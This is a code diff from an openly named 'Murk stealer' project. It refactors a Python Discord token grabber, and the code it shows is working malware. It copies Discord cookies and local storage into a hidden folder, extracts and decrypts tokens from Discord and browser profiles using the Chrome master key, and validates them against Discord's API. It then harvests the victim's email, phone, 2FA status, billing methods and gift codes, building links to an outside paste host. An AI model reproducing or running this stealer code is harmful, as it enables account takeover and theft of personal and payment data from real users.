@@ -10,31 +10,31 @@
 #             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
 #-----------------------------------------------------------------------------#
 
-import os
-import shutil
-import re
-import base64
-import json
-import requests
+from os import sep,environ,makedirs,getenv,path,listdir,walk
+from shutil import copy2,copytree
+from re import findall
+from base64 import b64decode
+from json import loads
+from requests import get
 from Crypto.Cipher import AES
 from win32crypt import CryptUnprotectData
 """
 all needed paths
 """
-path = r"discord\Network\Cookies"
+path3 = r"discord\Network\Cookies"
 path1 = r"discord\settings.json"
 path2 = r'discord\Local Storage\leveldb'
 
 def Discord(data):
     try:
         print("discord")
-        pathtofile = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
-        os.makedirs(rf'{pathtofile}\windll\Messengers\Discord')
-        user = os.environ['USERPROFILE'] + os.sep + r'AppData\Roaming'
-        shutil.copy2(user+ os.sep + path,rf'{pathtofile}\windll\Messengers\Discord')# copy data
-        shutil.copy2(user+ os.sep + path1,rf'{pathtofile}\windll\Messengers\Discord')# copy data
+        pathtofile = environ['USERPROFILE'] + sep + r'AppData\Local'
+        makedirs(rf'{pathtofile}\windll\Messengers\Discord')
+        user = environ['USERPROFILE'] + sep + r'AppData\Roaming'
+        copy2(user+ sep + path3,rf'{pathtofile}\windll\Messengers\Discord')# copy data
+        copy2(user+ sep + path1,rf'{pathtofile}\windll\Messengers\Discord')# copy data
         try:
-            shutil.copytree(user+ os.sep + path2,rf'{pathtofile}\windll\Messengers\Discord\Local Storage\leveldb')# copy dir
+            copytree(user+ sep + path2,rf'{pathtofile}\windll\Messengers\Discord\Local Storage\leveldb')# copy dir
         except:
             pass
         print("TokenGrabber")
@@ -54,8 +54,8 @@ class Discorde:
     def __init__(self):
         print("discord start")
         self.baseurl = "https://discord.com/api/v9/users/@me"
-        self.appdata = os.getenv("localappdata")
-        self.roaming = os.getenv("appdata")
+        self.appdata = getenv("localappdata")
+        self.roaming = getenv("appdata")
         self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
         self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
         self.tokens_sent = []
@@ -66,11 +66,11 @@ class Discorde:
         self.upload()
 
 
-    def get_master_key(self, path):
-        with open(path, "r", encoding="utf-8") as f:
+    def get_master_key(self, pathl):
+        with open(pathl, "r", encoding="utf-8") as f:
             c = f.read()
-        local_state = json.loads(c)
-        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+        local_state = loads(c)
+        master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
         master_key = master_key[5:]
         master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
         return master_key
@@ -116,19 +116,19 @@ class Discorde:
             'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
             'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'}
 
-        for name, path in paths.items():
-            if not os.path.exists(path):
+        for name, pathl in paths.items():
+            if not path.exists(pathl):
                 continue
             disc = name.replace(" ", "").lower()
-            if "cord" in path:
-                if os.path.exists(self.roaming + f'\\{disc}\\Local State'):
-                    for file_name in os.listdir(path):
+            if "cord" in pathl:
+                if path.exists(self.roaming + f'\\{disc}\\Local State'):
+                    for file_name in listdir(pathl):
                         if file_name[-3:] not in ["log", "ldb"]:
                             continue
-                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-                            for y in re.findall(self.encrypted_regex, line):
-                                token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\{disc}\\Local State'))
-                                r = requests.get(self.baseurl, headers={
+                        for line in [x.strip() for x in open(f'{pathl}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                            for y in findall(self.encrypted_regex, line):
+                                token = self.decrypt_val(b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\{disc}\\Local State'))
+                                r = get(self.baseurl, headers={
                                     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                     'Content-Type': 'application/json',
                                     'Authorization': token})
@@ -138,12 +138,12 @@ class Discorde:
                                         self.tokens.append(token)
                                         self.ids.append(uid)
             else:
-                for file_name in os.listdir(path):
+                for file_name in listdir(pathl):
                     if file_name[-3:] not in ["log", "ldb"]:
                         continue
-                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-                        for token in re.findall(self.regex, line):
-                            r = requests.get(self.baseurl, headers={
+                    for line in [x.strip() for x in open(f'{pathl}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                        for token in findall(self.regex, line):
+                            r = get(self.baseurl, headers={
                                 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                 'Content-Type': 'application/json',
                                 'Authorization': token})
@@ -153,14 +153,14 @@ class Discorde:
                                     self.tokens.append(token)
                                     self.ids.append(uid)
 
-        if os.path.exists(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
-            for path, _, files in os.walk(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
+        if path.exists(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
+            for pathl, _, files in walk(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
                 for _file in files:
                     if not _file.endswith('.sqlite'):
                         continue
-                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
-                        for token in re.findall(self.regex, line):
-                            r = requests.get(self.baseurl, headers={
+                    for line in [x.strip() for x in open(f'{pathl}\\{_file}', errors='ignore').readlines() if x.strip()]:
+                        for token in findall(self.regex, line):
+                            r = get(self.baseurl, headers={
                                 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                 'Content-Type': 'application/json',
                                 'Authorization': token})
@@ -180,9 +180,9 @@ class Discorde:
             headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                        'Content-Type': 'application/json',
                        'Authorization': token}
-            user = requests.get(self.baseurl, headers=headers).json()
-            payment = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers=headers).json()
-            gift = requests.get("https://discord.com/api/v9/users/@me/outbound-promotions/codes", headers=headers)
+            user = get(self.baseurl, headers=headers).json()
+            payment = get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers=headers).json()
+            gift = get("https://discord.com/api/v9/users/@me/outbound-promotions/codes", headers=headers)
             username = user['username'] + '#' + user['discriminator']
             discord_id = user['id']
             phone = user['phone']
@@ -215,7 +215,7 @@ class Discorde:
             val += f'Discord ID: {discord_id}\nEmail: {email}\nmobile_phone: {phone}\n2FA: {mfa}\nNitro: {nitro}\nBilling: {methods}\nToken: {token}\n'
 
             if "code" in gift.text:
-                codes = json.loads(gift.text)
+                codes = loads(gift.text)
                 for code in codes:
                     val_codes.append((code['code'], code['promotion']['outbound_title']))
 
@@ -232,6 +232,6 @@ class Discorde:
                 for c, t in val_codes:
                     val += f'\n{t}:\n{c}\nhttps://paste-pgpj.onrender.com/?p={c}\n'
             self.tokens_sent += token
-            pathtofile = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
+            pathtofile = environ['USERPROFILE'] + sep + r'AppData\Local'
         with open(rf"{pathtofile}\windll\Messengers\Discord\tokenGrabber.txt", "a", encoding="utf8") as file:
             file.write(val)
